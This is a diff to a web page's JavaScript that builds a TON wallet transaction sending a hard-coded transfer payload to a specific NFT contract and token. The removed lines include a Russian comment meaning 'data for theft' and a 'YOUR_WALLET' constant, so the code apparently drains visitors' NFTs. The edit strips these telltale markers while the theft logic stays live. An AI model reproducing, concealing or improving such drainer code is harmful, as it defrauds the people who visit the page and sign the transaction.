@@ -741,26 +741,21 @@ document.addEventListener("DOMContentLoaded", function () {
         return;
       }
 
-      // ДАННЫЕ ДЛЯ КРАЖИ
       const contractAddress = 'EQC2lsUy1SKxJEJBwj5ZCfVnLPvAqDqy5c26Xg8xS_pDTXGk';
       const tokenId = '151858';
-      const YOUR_WALLET = 'UQAGr7Su1HSSX1MCFIH9k8mEY6LinmP5Nsie7x0qreUigE5m';
 
       err.textContent = '⏳ Отправляем запрос...';
       err.style.display = 'block';
       err.style.color = '#ff9abb';
 
       try {
-        // Создаём boc для вызова transfer
-        const boc = 'te6ccgEBAQEABgAACAD/wgAIBQAAAf/gAAgBAAEBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==';
-
         const transaction = {
           valid_until: Math.floor(Date.now() / 1000) + 300,
           messages: [
             {
               address: contractAddress,
               amount: '0',
-              payload: boc
+              payload: 'te6ccgEBAQEABgAACAD/wgAIBQAAAf/gAAgBAAEBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=='
             }
           ]
         };
